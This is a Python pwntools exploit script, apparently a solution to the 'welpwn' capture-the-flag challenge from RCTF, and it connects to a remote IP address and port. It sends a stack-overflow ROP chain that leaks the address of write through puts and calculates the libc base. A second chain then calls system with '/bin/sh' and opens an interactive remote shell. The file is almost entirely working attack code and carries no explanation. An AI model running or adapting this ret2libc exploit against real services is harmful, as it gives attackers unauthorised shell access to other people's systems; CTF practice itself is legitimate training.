from pwn import *
#sh=process('./welpwn')
sh=remote('111.198.29.45',45252)
elf=ELF('./welpwn')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('./libc64-2.19.so')
poprdi_ret=0x4008a3
pop4_ret=0x40089c
puts_plt=elf.plt['puts']
write_got=elf.got['write']
start=0x400630
sh.recvuntil('Welcome to RCTF\n')
payload='a'*0x10+'b'*8+p64(pop4_ret)
payload+=p64(poprdi_ret)+p64(write_got)+p64(puts_plt)+p64(start)
sh.send(payload)
sh.recvuntil('a'*0x10+'b'*8)
sh.recv(3)
write_adr=u64(sh.recv(6).ljust(8,'\x00'))
print 'write_adr: '+hex(write_adr)
#libc_base=write_adr-libc.symbols['write']
libc_base=write_adr-0x0f72b0
print 'libc_base: '+hex(libc_base)
system_adr=libc_base+0x045390
binsh_adr=libc_base+0x18cd57
'''
system_adr=libc_base+libc.symbols['system']
binsh_adr=libc_base+libc.search('/bin/sh\x00').next()
sh.recvuntil('Welcome to RCTF\n')
'''
payload='a'*0x10+'b'*8+p64(pop4_ret)
payload+=p64(poprdi_ret)+p64(binsh_adr)+p64(system_adr)
sh.send(payload)
sh.interactive()
